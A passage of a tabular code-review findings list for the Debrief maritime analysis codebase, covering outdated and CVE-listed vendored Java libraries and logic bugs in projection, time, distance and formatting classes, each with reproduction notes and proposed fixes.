org.mwc.cmap.legacy/libs/junit-4.12.jar; org.mwc.cmap.legacy/libs/hamcrest-core-1.2.jar; org.mwc.debrief.track_shift/lib/finmath-lib-3.1.9-sources.jar; org.mwc.debrief.legacy/conf/one-jar-ant-task-0.97.jar; org.mwc.gnd.demonstrator/libs/pljava.jar; org.mwc.debrief.build/lib/jsch-0.1.44.jar; org.mwc.asset.build/lib/jsch-0.1.44.jar; org.mwc.debrief.build/lib/checkstyle-5.6-all.jar,None at runtime; scanner noise only.,git rm all listed jars; add a CI check that every jar under a plugin appears in its Bundle-ClassPath.,S,Needed automated MANIFEST/build.properties cross-check across 40 plugins.,CVE-2013-4002; CVE-2022-23437; CVE-2021-37533; CVE-2020-15250; CVE-2016-5725,
CR-207,A4,org.mwc.cmap.core,-,jai_core-1.1.3.jar,org.mwc.cmap.core/image_libs/jai_core-1.1.3.jar,supply-chain,outdated-dependency,Low,Medium,candidate,JAI 1.1.3 (2006) / jai_imageio 1.1 / imageio-ext 1.1.2 decode untrusted GeoTIFF,"org.mwc.cmap.core/image_libs bundles jai_core-1.1.3, jai_codec-1.1.3, jai_imageio-1.1 and imageio-ext-tiff/utilities 1.1.2 while org.mwc.cmap.geotools bundles the same JAI plus imageio-ext 1.2.2 and org.mwc.cmap.media a 1.0-rc jai_imageio.jar (three different versions of the same native-backed codec set). JAI has been abandoned by Oracle since 2006 and has no vulnerability tracking; the TIFF decoder is fed analyst-supplied .tif files via TifLoader (plugin.xml L216) and WorldImageLayer.","org.mwc.cmap.core/META-INF/MANIFEST.MF L6-L12; org.mwc.cmap.geotools/META-INF/MANIFEST.MF (jai_*, imageio-ext-*-1.2.2); org.mwc.cmap.media/lib/jai_imageio.jar; org.mwc.debrief.core/plugin.xml L216",A crafted GeoTIFF opened as a background image.,Consolidate on imageio-ext 1.4.x + jai-ext (the GeoTools 33 stack) in one plugin and remove the two other copies.,M,Needed to spot the three divergent copies across plugins.,#5237,
CR-208,A4,org.mwc.cmap.jfreechart,-,jfreechart-1.0.19.jar,org.mwc.cmap.jfreechart/libs/jfreechart-1.0.19.jar,supply-chain,outdated-dependency,Low,High,candidate,JFreeChart 1.0.19 (2014) + jcommon 1.0.23 + SWT/experimental forks,"jfreechart-1.0.19.jar, jfreechart-1.0.19-swt.jar, jfreechart-1.0.19-experimental.jar and jcommon-1.0.23.jar are the 2014 release; no CVEs are recorded by OSV, but 1.0.x is unmaintained (current 1.5.6), the SWT bridge was dropped upstream and jcommon is discontinued. Widely used for all Debrief XY/TMA plots so any Java 25 (#5237) rendering regressions land here.",org.mwc.cmap.jfreechart/META-INF/MANIFEST.MF L12-L16,N/A,"Move to jfreechart 1.5.x (jcommon merged), keep the small SWT ChartComposite fork in-tree.",M,grep-able,#5237,
CR-209,A4,org.mwc.cmap.legacy,-,jackson-mapper-asl-1.9.4.jar,org.mwc.cmap.legacy/libs/jackson-mapper-asl-1.9.4.jar,supply-chain,vulnerable-dependency,Low,High,candidate,"Codehaus Jackson 1.9.4 (EOL, CVE-2019-10202/10172) in dormant GND code","jackson-mapper-asl-1.9.4 has CVE-2019-10202 (Critical: polymorphic deserialisation gadgets when default typing is enabled) and CVE-2019-10172 (XXE in DOM deserialiser). Debrief calls only ObjectMapper.readValue(..., Map.class/JsonNode.class) and readTree (GNDDocHandler L77-78, GNDStore L170, L208, GDataset L192) without enableDefaultTyping, so the gadget path is not reachable; the GND cloud feature itself is effectively dormant. Duplicate copies sit in org.mwc.asset.legacy and org.mwc.debrief.GNDManager (not in the Maven build). Jackson 1.x is unmaintained and should be folded into the jackson 2.x already in org.mwc.debrief.legacy.","org.mwc.cmap.legacy/META-INF/MANIFEST.MF L11-L12; MWC/Utilities/ReaderWriter/json/GNDDocHandler.java L77-L78; MWC/Utilities/ReaderWriter/json/GNDStore.java L170, L208; MWC/TacticalData/GND/GDataset.java L192",Not reachable with current call pattern.,Port the four GND classes to com.fasterxml.jackson 2.x (already bundled in org.mwc.debrief.legacy) and delete the asl jars from all three plugins.,M,Needed to verify default typing is not enabled anywhere before dismissing the Critical CVE.,CVE-2019-10202; CVE-2019-10172,
CR-210,A4,org.mwc.cmap.legacy,-,openmap.jar,org.mwc.cmap.legacy/libs/openmap.jar,supply-chain,outdated-dependency,Low,Medium,candidate,Two unversioned OpenMap jars (one built with JDK 1.2.1) on classpath,"org.mwc.cmap.legacy/libs/openmap.jar (1.2 MB, manifest Created-By 1.2.1, i.e. circa 1999-2001, no version) is on Bundle-ClassPath L7 and 28 MWC.* classes import com.bbn.openmap (VPF, projections, omGraphics); org.mwc.cmap.openmap/libs/openmap.jar is a separate 3.6 MB 2014 build (5.x) with an unreferenced openmap-sources.jar. Both plugins export com.bbn.openmap packages, so which implementation wins depends on bundle resolution order. Also jmf.jar, vrml97.jar and flanagan.jar in the same directory are unversioned 1990s/2000s binaries.","org.mwc.cmap.legacy/META-INF/MANIFEST.MF L7-L10, L91-L98, L150-L151, L214-L215; org.mwc.cmap.openmap/META-INF/MANIFEST.MF L11; org.mwc.cmap.openmap/libs/openmap-sources.jar (unreferenced)",Split-package resolution surprises when both bundles export com.bbn.openmap.,"Keep a single OpenMap 5.1.x jar in org.mwc.cmap.openmap, drop the copy from cmap.legacy and rename jars to carry versions.",M,Needed reading both manifests and the exported-package lists.,#5237,
CR-211,A4,org.mwc.cmap.media,-,logback-classic.jar,org.mwc.cmap.media/lib/logback-classic.jar,supply-chain,outdated-dependency,Low,High,candidate,logback 0.9.14 (2008) and slf4j-api 1.5.6 bundled in media plugin,"logback-classic.jar / logback-core.jar carry pom.properties version 0.9.14 (Dec 2008) and lib/slf4j-api.jar is 1.5.6; OSV lists CVE-2017-5929 (Critical, SocketServer/ServerSocketReceiver deserialisation), CVE-2021-42550 (JNDI via config), CVE-2023-6378 and CVE-2024-12798/12801. None is reachable because the plugin neither opens a logback socket receiver nor loads a user-editable logback.xml, but the jars are 17 years old, unversioned in their filenames, and the slf4j 1.5.6 API conflicts with the slf4j 1.7.x bindings in org.mwc.debrief.legacy and org.mwc.cmap.geotools.",org.mwc.cmap.media/META-INF/MANIFEST.MF L18-L26; org.mwc.cmap.media/lib/logback-classic.jar (pom.properties version=0.9.14); lib/logback-core.jar; lib/slf4j-api.jar (Bundle-Version 1.5.6),Not reachable.,Remove logback (Xuggler only needs slf4j) and depend on the single slf4j-api 1.7.36/2.x bundle from the target platform.,S,Version had to be read from pom.properties inside the jar; filename gives none.,CVE-2017-5929; CVE-2021-42550; CVE-2023-6378,
CR-212,A4,org.mwc.debrief.GNDManager,-,guava-14.0-rc1.jar,org.mwc.debrief.GNDManager/libs/guava-14.0-rc1.jar,supply-chain,vulnerable-dependency,Low,High,candidate,"Plugins outside the Maven build (GNDManager, asset.comms) carry vulnerable jars","org.mwc.debrief.GNDManager (guava-14.0-rc1 with CVE-2018-10237 unbounded-memory deserialisation, CVE-2020-8908, CVE-2023-2976; jackson-*-asl-1.9.4 with CVE-2019-10202; es4gwt, swing2swt) and org.mwc.asset.comms (unversioned com.thoughtworks.xstream.jar, Restlet 2.x, Smack XMPP, org.json, jettison; no MANIFEST.MF at all) are not listed as modules in pom.xml, so they are neither built nor shipped, but they remain importable Eclipse projects and are indexed by scanners.",org.mwc.debrief.GNDManager/META-INF/MANIFEST.MF (Bundle-ClassPath); org.mwc.debrief.GNDManager/libs/guava-14.0-rc1.jar; org.mwc.asset.comms/libs/RestLet/lib/com.thoughtworks.xstream.jar; org.mwc.asset.comms/libs/smack.jar; pom.xml L33-L107 (no module entries),Only if a developer manually adds the plugin to a launch config.,Delete both plugins (history preserves them) or move them to an archive repository.,S,Needed comparing pom.xml module list with plugin directories.,CVE-2018-10237; CVE-2019-10202,
CR-213,A4,org.mwc.debrief.TimeBar,-,org.eclipse.nebula.widgets.ganttchart-2.0-NIGHTLY.jar,org.mwc.debrief.TimeBar/libs/org.eclipse.nebula.widgets.ganttchart-2.0-NIGHTLY.jar,supply-chain,outdated-dependency,Low,High,candidate,Nebula GanttChart 2.0-NIGHTLY snapshot vendored instead of Nebula bundle,"The TimeBar plugin bundles an unreproducible nightly build (Build-Jdk 1.7.0) of the Nebula GanttChart widget plus an unreferenced -sources jar at the plugin root, while the target platform already consumes Nebula 2.5.0 (eclipse-latest.target L95) which publishes org.eclipse.nebula.widgets.ganttchart as a proper bundle. Similarly org.mwc.cmap.NarrativeViewer vendors seven 2016/2017 Nebula/NatTable/GlazedLists jars and org.mwc.cmap.core vendors formattedtext 1.0.0.",org.mwc.debrief.TimeBar/META-INF/MANIFEST.MF L7; org.mwc.debrief.TimeBar/org.eclipse.nebula.widgets.ganttchart-2.0-NIGHTLY-sources.jar (unreferenced); org.mwc.cmap.NarrativeViewer/libs/*.jar; org.mwc.cmap.core/libs/org.eclipse.nebula.widgets.formattedtext_1.0.0.jar,N/A,Require the Nebula bundles from the target platform (Nebula 3.x) and delete the vendored copies.,M,grep-able,#5237,
CR-214,A4,org.mwc.debrief.legacy,-,commons-io-2.6.jar,org.mwc.debrief.legacy/libs/commons-io-2.6.jar,supply-chain,outdated-dependency,Low,High,candidate,"commons-io 2.6/2.1 (CVE-2021-29425, CVE-2024-47554) x3, vulnerable APIs unused","commons-io-2.6.jar (debrief.legacy L14 and cmap.geotools) and commons-io-2.1.jar (cmap.media) predate CVE-2021-29425 (FilenameUtils.normalize path traversal) and CVE-2024-47554 (XmlStreamReader DoS). Debrief code calls neither FilenameUtils.normalize nor XmlStreamReader (only FileUtils.deleteDirectory and IOUtils), so not reachable; three different copies of the same library is the real problem.",org.mwc.debrief.legacy/META-INF/MANIFEST.MF L14; org.mwc.cmap.geotools/libs/commons-io-2.6.jar; org.mwc.cmap.media/lib/commons-io-2.1.jar,Not reachable.,Consume org.apache.commons.io 2.18 from the target platform (Orbit) once and drop the vendored copies.,S,grep-able,CVE-2021-29425; CVE-2024-47554; #5237,
CR-215,A4,org.mwc.debrief.legacy,-,jackson-databind-2.11.2.jar,org.mwc.debrief.legacy/libs/jackson-databind-2.11.2.jar,supply-chain,outdated-dependency,Low,High,candidate,jackson-databind/core 2.11.2 (9+3 CVEs) only parse Debrief's own GeoJSON output,"jackson-databind-2.11.2 is listed for CVE-2020-36518, CVE-2021-46877, CVE-2022-42003/42004 (deep-nesting DoS) and five 2026 advisories; jackson-core-2.11.2 for CVE-2025-52999/49128. The sole consumers are GenerateGeoJSON/GenerateSegmentedGeoJSON (readValue at L93, L152, L211, L280) which re-parse strings Debrief itself just serialised while building a GeoPDF, so no untrusted input reaches the parser. Still five years behind and a #5237 candidate.","org.mwc.debrief.legacy/META-INF/MANIFEST.MF L18-L20; Debrief/ReaderWriter/GeoPDF/GenerateGeoJSON.java L92-L93, L151-L152, L210-L211, L279-L280",None with current usage.,Bump the three jackson jars to 2.18.x (binary compatible for this usage).,S,Needed to confirm input provenance.,CVE-2020-36518; CVE-2022-42003; CVE-2022-42004; CVE-2025-52999; #5237,
CR-216,A4,org.mwc.debrief.legacy,-,poi-3.14-20160307.jar,org.mwc.debrief.legacy/libs/poi-3.14-20160307.jar,supply-chain,vulnerable-dependency,Low,High,candidate,"Dead Apache POI 3.14 + xmlbeans 2.6.0 jars (XXE, DoS CVEs) still committed","poi-3.14-20160307.jar, poi-ooxml-3.14.jar, poi-ooxml-schemas-3.14.jar, poi-scratchpad-3.14-20160307.jar and xmlbeans-2.6.0.jar are in org.mwc.debrief.legacy/libs but are absent from both MANIFEST.MF Bundle-ClassPath (L6-23) and build.properties bin.includes, so they are never loaded or shipped; POI classes resolve to the 4.1.2 copies exported by org.mwc.cmap.legacy. They still carry CVE-2017-12626, CVE-2017-5644, CVE-2019-12415, CVE-2022-26336 and xmlbeans CVE-2021-23926 (XXE, Critical), confusing scanners and adding ~11 MB to every clone.",org.mwc.debrief.legacy/libs/poi-3.14-20160307.jar; libs/poi-ooxml-3.14.jar; libs/poi-ooxml-schemas-3.14.jar; libs/poi-scratchpad-3.14-20160307.jar; libs/xmlbeans-2.6.0.jar; org.mwc.debrief.legacy/META-INF/MANIFEST.MF L6-L23,None at runtime; any SCA tool scanning the repo reports Critical findings.,git rm the five jars.,S,Needed cross-checking MANIFEST.MF/build.properties against the libs directory.,CVE-2021-23926; CVE-2017-12626; CVE-2017-5644; CVE-2019-12415,
CR-217,A4,org.mwc.debrief.legacy,-,slf4j-api.jar,org.mwc.debrief.legacy/libs/slf4j-api.jar,supply-chain,api-misuse,Low,High,candidate,slf4j-api 1.5.6 with slf4j-simple 1.7.25; manifest lists missing jars,"libs/slf4j-api.jar has Bundle-Version 1.5.6 (2008) while libs/slf4j-simple-1.7.25.jar is a 1.7.x binding; SLF4J's LoggerFactory version check emits a 'binding not compatible' warning and behaviour is unsupported. The same MANIFEST.MF also lists libs/sf-2.0.3.jar and libs/sf-geojson-2.0.4.jar on Bundle-ClassPath (L21-22) although neither file exists in the repository or build.properties, so PDE reports a broken classpath and any code expecting mil.nga.sf would fail at runtime.","org.mwc.debrief.legacy/META-INF/MANIFEST.MF L11-L12, L21-L22; org.mwc.debrief.legacy/libs/slf4j-api.jar",Start Debrief: SLF4J prints a version-mismatch warning; developer workspace shows missing-jar classpath error.,Replace libs/slf4j-api.jar with slf4j-api-1.7.36.jar (or import the package from the platform) and delete the two sf-* Bundle-ClassPath entries.,S,Needed reading the jar manifest and diffing Bundle-ClassPath against the libs directory.,-,
CR-218,A4,org.mwc.debrief.lite,-,swingx-core-1.6.6-SNAPSHOT.jar,org.mwc.debrief.lite/libs/swingx-core-1.6.6-SNAPSHOT.jar,supply-chain,outdated-dependency,Low,High,candidate,Debrief Lite ships SwingX 1.6.6-SNAPSHOT (dead project) and Radiance 3.0.0,"Four swingx-*-1.6.6-SNAPSHOT jars are unreproducible snapshot builds of a project abandoned in 2013 (last release 1.6.5-1), and radiance-{flamingo,neon,substance,substance-extras,trident}-3.0.0 (2020) are three major versions behind (Radiance 8.x, Java 17+ required); Radiance 3.x relies on internal sun.* Swing APIs that Java 25 (#5237) removes. All are on the lite Bundle-ClassPath (L165-174). An unreferenced 1.5/lib/debrief-lite.jar (a stale built product) is also committed.",org.mwc.debrief.lite/META-INF/MANIFEST.MF L165-L174; org.mwc.debrief.lite/libs/swingx-*-1.6.6-SNAPSHOT.jar; libs/radiance-*-3.0.0.jar; org.mwc.debrief.lite/1.5/lib/debrief-lite.jar (unreferenced),Run Debrief Lite on Java 17+/25: Substance look-and-feel reflection failures.,"Replace SwingX widgets with FlatLaf/plain Swing, upgrade Radiance to a supported line, delete 1.5/lib/debrief-lite.jar.",M,grep-able,#5237,
CR-219,A5,org.mwc.cmap.legacy,MWC.Algorithms.Projections,FlatProjection,org.mwc.cmap.legacy/src/MWC/Algorithms/Projections/FlatProjection.java,bug,null-deref,Low,High,candidate,setScaleVal/offsetOrigin NPE on null data area; negative zoom clamps,"offsetOrigin() checks getScreenArea() for null but not getDataArea(), then calls getDataArea().getWidth() and getDataArea().getCentre(); setScaleVal() (exposed as the 'Scaling factor' property in FlatProjectionInfo) calls offsetOrigin(true) unconditionally, so editing the property before any data is loaded throws NPE. zoom(value) with a negative factor makes _scaleVal negative, which offsetOrigin clamps to 2e-7 (maximum zoom-in) instead of rejecting it.",L167-L213; L230-L234; L426-L433,Open the projection properties on an empty plot and edit Scaling factor; or a zoom action computed with a negative factor.,Guard getDataArea()==null in offsetOrigin and reject non-positive zoom factors.,S,grep-able,-,
CR-220,A5,org.mwc.cmap.legacy,MWC.Algorithms.Projections,JMapTransformMercator,org.mwc.cmap.legacy/src/MWC/Algorithms/Projections/JMapTransformMercator.java,algorithm-correctness,projection-error,Low,High,verified,toWorld mirrors longitude about the centre; zoom() is a no-op,"getPoint(double,double) maps x to (x - centerMap)*latScale*scale + centerScreen, but the inverse getPoint(int,int) returns centerMap - (xs - centerScreen)/(latScale*scale), i.e. 2*centerMap - x (python check: x=13, centre 10 -> 7). The inverse also evaluates latScale at a different latitude than the forward transform, and zoom() is empty so the projection cannot be zoomed. Also uses PI=3.1415927 and '|' instead of '||' at L58. Class is unreferenced (dead).",L46-L55; L58; L108-L110,Enable JMapTransformMercator: clicking on the plot reports a longitude reflected about the screen centre.,"Remove the class, or fix the sign in the inverse and implement zoom.",S,Sign error visible only by algebraically inverting the forward transform.,-,
CR-221,A5,org.mwc.cmap.legacy,MWC.Algorithms.Projections,Mercator2,org.mwc.cmap.legacy/src/MWC/Algorithms/Projections/Mercator2.java,algorithm-correctness,precision-loss,Low,High,verified,Integer division zeroes ellipsoid terms; sin(lat^3); (long) cast precedence,"setEllipse computes _A0 = 1 - 1/4*_e2 - 3/64*_e4 - 5/256*_e6 etc. with integer literals, so 1/4, 3/64, 3/8, 15/256, 35/3072 evaluate to 0 and _A0=1, _A2=_A4=_A6=0 (python: correct A0=0.99832, A2=0.00252). mParts uses 1/3*_e4 and 1/5*_e6 (=0) and Math.sin(Math.pow(lat,3)) instead of sin(lat)^3 (error 0.033 arc-min at 60N). In toWorld, ((long) mParts(lat2) * 10000) casts before multiplying, so the bisection compares whole arc-minutes and stops with up to 1 arc-minute error. The class is currently only referenced in a commented-out line of AWTChart, so impact is latent. Mercator3 repeats the same expressions (L158-L159, L215-L220).",L209-L210; L264-L269; L350,Enable Mercator2 as the chart projection: latitude round trips are quantised to ~1 nm and the ellipsoidal corrections are dropped.,"Use double literals (1.0/4, 3.0/64 ...), Math.pow(Math.sin(lat),3), and (long)(mParts(lat2)*10000) or a direct double comparison.",S,Integer-literal division inside double expressions is a classic reading-level bug; CodeQL has a rule for it but the cast-precedence and sin(lat^3) errors need the formula.,Mercator3 L158-L159 L215-L220,
CR-222,A5,org.mwc.cmap.legacy,MWC.Algorithms.Projections,Mercator3,org.mwc.cmap.legacy/src/MWC/Algorithms/Projections/Mercator3.java,algorithm-correctness,logic-error,Low,High,candidate,toScreen swaps latitude and longitude; central meridian set from a latitude,"toScreen assigns d1 = getLong() and d2 = getLat(), then wraps d2 (latitude) by +/-360 relative to _centralMeridian and feeds d1 (longitude) into tan(45 + 0.5*d1) as if it were latitude; rescale() sets _centralMeridian = wa.getBottomRight().getLat(). Output ignores the screen size and _scaleVal entirely (returns metres in nautical-mile units), and toWorld is the inverse of a different formula, so toScreen/toWorld do not round-trip. Class is unreferenced (dead) apart from itself.",L189; L238-L258; L280-L320,Instantiate Mercator3 as the chart projection: every location is plotted with lat/long transposed and off-screen.,Delete the class or rewrite toScreen using lat for the tan term and long for the meridian offset with the screen scale applied.,M,Variable names d1..d9 hide the transposition; only reading the trig identifies which argument is which.,-,
CR-223,A5,org.mwc.cmap.legacy,MWC.GenericData,Duration,org.mwc.cmap.legacy/src/MWC/GenericData/Duration.java,bug,precision-loss,Low,High,verified,Constructor truncates to whole milliseconds despite microsecond units,"The constructor stores (long) convert(units, MILLISECONDS, value), so any sub-millisecond duration is truncated (verified: new Duration(0.5, MILLISECONDS).getMillis()==0 and new Duration(500, MICROSECONDS).getMillis()==0) even though a MICROSECONDS unit is offered and the field comment says microseconds. round() also uses an asymmetric 0.51 threshold and floors negatives.",L186-L192; L243-L245; L114-L131,Time-step or trail-length of 0.5 ms configured in a .dpf Stepper element is silently loaded as 0.,Store microseconds (or a double) internally and round rather than truncate when converting.,S,grep-able,-,
CR-224,A5,org.mwc.cmap.legacy,MWC.GenericData,TimePeriod,org.mwc.cmap.legacy/src/MWC/GenericData/TimePeriod.java,bug,logic-error,Low,High,verified,intersects() returns inverted period for disjoint inputs,"intersects() takes max(start) and min(end) without checking they are ordered, so two non-overlapping periods yield a period whose start is after its end (verified: [0,10] intersect [20,30] -> start 20000us, end 10000us, isConsistent=false) with no null/empty signal; BearingResidualsView uses the result to bound plots. isConsistent() uses strict < although its javadoc says 'before or equals', so a zero-length period is inconsistent.",L189-L196; L201-L204,Sensor data coverage entirely outside the visible period in the bearing residuals view: inverted plot range.,Return null (or an empty marker) when startP > endP and document it; use <= in isConsistent.,S,grep-able,org.mwc.debrief.track_shift BearingResidualsView L344-L354,
CR-225,A5,org.mwc.cmap.legacy,MWC.GenericData,WorldArea,org.mwc.cmap.legacy/src/MWC/GenericData/WorldArea.java,bug,logic-error,Low,High,verified,setCentredWidth/Height no-ops (WorldVector arg order); getCentre aliasing,"setCentredWidth builds new WorldVector(newWidth - getWidth(), 0, 0), but the constructor signature is (bearingRads, rangeDegs, depth), so the width delta is used as a bearing with zero range and extend() does nothing; verified an area of width 2 stays width 2 after setCentredWidth(4). In addition getCentre() returns the single mutable _thisCentre instance, so originalCenter (held by these methods) is overwritten by setCentre's own getCentre() call, and external holders such as FlatProjection._dataOrigin alias the area's internal centre.",L566-L581; L908-L924; L959-L966; L972-L980,Any future caller of setCentredWidth (currently unused) gets an unchanged area; code storing getCentre() then mutating the area sees its stored value change.,"Pass the delta as the range (bearing pi/2), return a copy from getCentre(), or remove the unused methods.",S,grep-able,-,
CR-226,A5,org.mwc.cmap.legacy,MWC.GenericData,WorldDistance,org.mwc.cmap.legacy/src/MWC/GenericData/WorldDistance.java,bug,float-equality,Low,High,verified,equals compares converted doubles exactly while hashCode uses raw value+units,"equals() returns getValueIn(DEGS) == other.getValueIn(DEGS) (exact floating comparison of two converted values) whereas hashCode() hashes _myDistance and _myUnits, so objects the class deems equal hash differently. Verified by compiling: new WorldDistance(60, MINUTES).equals(new WorldDistance(1, DEGS)) is true (the inline test asserts this) but their hashCodes differ. Conversions that are not bit-exact (e.g. yards vs kyds) can also make equal physical distances unequal.",L219-L229; L267-L276; L139-L151,WorldDistance values stored in a HashSet (e.g. distinct range-ring radii) with the same length in different units.,Hash the canonical value (e.g. Double.hashCode of getValueIn(METRES)) and compare with a small relative tolerance or Double.compare on the canonical unit.,S,grep-able,-,
CR-227,A5,org.mwc.cmap.legacy,MWC.GenericData,WorldLocation,org.mwc.cmap.legacy/src/MWC/GenericData/WorldLocation.java,bug,float-equality,Low,High,verified,Tolerance-based equals() without hashCode(); non-transitive equality,"equals(WorldLocation) accepts lat/long within 1e-11 deg but requires exact depth equality, and the class does not override hashCode(), so equal locations have different identity hash codes (verified: two identical WorldLocation(1,2,3) report equals=true, hashCode equal=false), breaking HashMap/HashSet semantics; tolerance equality is also non-transitive. equals(WorldLocation) also dereferences a null argument.",L543-L569,WorldLocation used as a HashSet element or HashMap key (e.g. de-duplicating fixes): duplicates are not detected.,"Either compare exactly (Double.compare) and add a matching hashCode, or drop equals override in favour of an explicit approxEquals method.",S,grep-able,-,
CR-228,A5,org.mwc.cmap.legacy,MWC.Utilities.TextFormatting,BriefFormatLocation,org.mwc.cmap.legacy/src/MWC/Utilities/TextFormatting/BriefFormatLocation.java,bug,thread-safety,Low,High,candidate,Static _workingHolder and DecimalFormats shared by all threads,"toStringLat/toStringLong write into the static brokenDown _workingHolder and then read deg/min/sec/hem from it while formatting with static DecimalFormat instances (not thread-safe). WorldLocation.toString() routes here, so any concurrent logging/labelling of locations from two threads can emit a latitude composed of another thread's fields.",L139-L151; L183-L209; L217-L234,Background import logging locations while the UI renders coordinate labels.,Allocate a brokenDown per call (it is tiny) and use ThreadLocal or per-call DecimalFormat.,S,grep-able,-,
CR-229,A5,org.mwc.cmap.legacy,MWC.Utilities.TextFormatting,DebriefFormatDateTime,org.mwc.cmap.legacy/src/MWC/Utilities/TextFormatting/DebriefFormatDateTime.java,bug,thread-safety,Low,High,candidate,Static SimpleDateFormat shared unsynchronised in toString paths,"parseThis is synchronized but toString(long), toStringHiRes and formatMicros use the same static _dfMillis/_df/_micros/_millis instances unsynchronised; SimpleDateFormat and DecimalFormat are not thread-safe, so concurrent formatting (background export job plus UI tote/narrative rendering) can produce garbled date strings or exceptions.",L147-L150; L174-L178; L319-L337; L346-L379,Export to .rep in a background job while the time controller repaints DTG labels.,"Use ThreadLocal formatters or java.time DateTimeFormatter (immutable), or synchronise the formatting methods consistently.",S,grep-able,-,
CR-230,A5,org.mwc.cmap.legacy,MWC.Utilities.TextFormatting,DebriefFormatLocation,org.mwc.cmap.legacy/src/MWC/Utilities/TextFormatting/DebriefFormatLocation.java,bug,logic-error,Low,High,verified,Emits 60.00 seconds and 60 minutes fields in Debrief/REP location text,"brokenDown truncates minutes with (int) and only zeroes seconds when sec > 59.99999, so seconds in (59.995, 59.99999] are formatted by the 00.00 pattern as 60.00; when the carry does fire, min++ can reach 60 with no carry into degrees. Verified by compiling: WorldLocation(12.34999..., 12.99999999) formats as ""12 20 60.00 N 012 59 60.00 E"". The numeric value round-trips on re-import (12+59/60+60/3600 = 13.0) but the text violates the DDD MM SS.SS format contract and breaks any consumer validating 0<=SS<60.",L34-L46; L72-L98,Export a fix at latitude 12.9999999 to .rep.,Round to the output resolution first (e.g. work in hundredths of a second as a long) and carry seconds->minutes->degrees.,S,Boundary/rounding behaviour needs a worked example; grep cannot find it.,-,
CR-231,A6,org.mwc.debrief.legacy,Debrief.Wrappers,SensorWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/SensorWrapper.java,algorithm-correctness,logic-error,Low,High,candidate,createItem compares _last range units with itself (mixed units mis-interpolated),"The condition _last.getRange().getUnits() == _last.getRange().getUnits() is always true, so when consecutive cuts carry ranges in different units (e.g. 2 NM and 4000 yds, possible from DPF) the raw values are interpolated and labelled with the first unit, producing a wrong resampled range.",L1057-L1066,"Sensor whose cuts mix range units, then 'Resample data at'",Compare _last with _next.,S,grep-able only with a same-variable-comparison rule; otherwise needs reading.,-,
CR-232,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TMAWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TMAWrapper.java,algorithm-correctness,logic-error,Low,High,candidate,createItem interpolates range between _last and _last,"rangeYds = interp.interp(_last.getRange()..., _last.getRange()...) ignores _next, so resampled range/bearing-defined TMA solutions keep the previous range instead of interpolating.",L526-L527,"TMA solution defined by range/bearing (no origin), resampled to a new frequency",Use _next.getRange() as the second argument.,S,Copy-paste error visible only by reading argument pairs.,-,
CR-233,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TacticalDataWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TacticalDataWrapper.java,bug,logic-error,Low,Medium,candidate,getNearestTo caches (lastContact/lastDTG) survive add/remove of contacts,"SensorWrapper.getNearestTo and TMAWrapper.getNearestTo return lastContact when DTG equals lastDTG, but TacticalDataWrapper.removeElement/add/trimTo/decimate reset only _timePeriod, so a deleted or replaced contact is returned for the last-requested time (e.g. by the tote or by RelativeTMASegment.getHostLocation).",L828; L840-L845; SensorWrapper L1332-L1396; TMAWrapper L585-L650,"Step the time to a cut, delete the cut, query again at the same time","Null lastContact/lastDTG in removeElement, add, trimTo and decimate.",S,Stale-cache reasoning across two classes.,-,
CR-234,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TrackWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TrackWrapper.java,bug,off-by-one,Low,High,candidate,getItemsBetween interpolated branch excludes the end time,"The interpolated loop uses newTime < end, so a period ending exactly on a minute boundary omits the final sample although the javadoc says inclusive of both ends; the non-interpolated branch is inclusive.",L2004-L2015,"Interpolate points on, request items between 10:00 and 10:05; the 10:05 sample is missing",Use <= end and include the exact end time.,S,grep-able,-,
CR-235,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.ambiguity,AmbiguityResolver,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/ambiguity/AmbiguityResolver.java,algorithm-correctness,sign-error,Low,Medium,candidate,"sysDelta only corrected for >180, not <-180, so TRIP_ZIG detection is asymmetric","ambigBrgDelta is negated when (ambigBrgDelta - brgDelta) > 180 but not when it is < -180, although both are the same wrap condition mirrored. When brgDelta ~ +170 and ambigBrgDelta ~ -170 the signs are left unequal and TRIP_ZIG is not tripped, whereas the mirrored case is. Turn direction therefore changes whether an ownship turn is detected.",L1228-L1238,Two consecutive ambiguous cuts where bearing goes 005->175 and ambiguous bearing 355->185 (deltas +170 and -170).,Handle both signs (if (Math.abs(sysDelta) > 180) ambigBrgDelta = -ambigBrgDelta) or compare with a proper shortAngle of the two deltas.,S,Needs understanding that the two wrap directions must be treated symmetrically; not grep-able.,-,
CR-236,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.ambiguity,LegOfCuts,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/ambiguity/LegOfCuts.java,algorithm-correctness,angle-wrap,Low,Medium,candidate,Unwrap threshold 200 deg in putObsInCorrectDomain differs from the 180 used e...,"getCurve() unwraps with |delta|>180, then re-wraps to [0,360) and unwraps again with |delta|>200. A genuine consecutive-cut jump between 180 and 200 degrees is therefore treated as real, while the earlier 180 unwrap is discarded. The Double.MIN_VALUE sentinel (smallest positive double) used for 'no previous value' is also fragile.",L126-L153; L231-L241; L129-L132,"Leg whose consecutive cuts read 350 then 175 (a 185 degree step) - unwrapped by the first pass, undone by putObsInCorrectRange, not re-unwrapped by the 200 threshold.",Use a single unwrap pass with the 180 threshold (drop putObsInCorrectRange or apply it before the unwrap) and use null/NaN as the sentinel.,S,Requires noticing the three-stage wrap/unwrap sequence and the differing thresholds.,-,
CR-237,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.operations,ResolveAmbiguity,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/operations/ResolveAmbiguity.java,bug,null-deref,Low,High,candidate,tracks.add(sensor.getHost()) executed even when the reference sensor is null,"OperateOnSourceSensor.execute guards the contact loop with 'if (sensor != null)' but the following 'tracks.add(sensor.getHost())' is outside the guard, so a RelativeTMASegment whose reference sensor cannot be found (renamed/deleted sensor after the leg was created) throws NullPointerException from the right-click 'Keep Port/Starboard bearings' actions.",L90-L98,Right-click a RelativeTMASegment whose getReferenceSensor() returns null (sensor deleted from the ownship track) and choose Keep Port bearings.,Move the tracks.add call inside the null check.,S,grep-able,-,
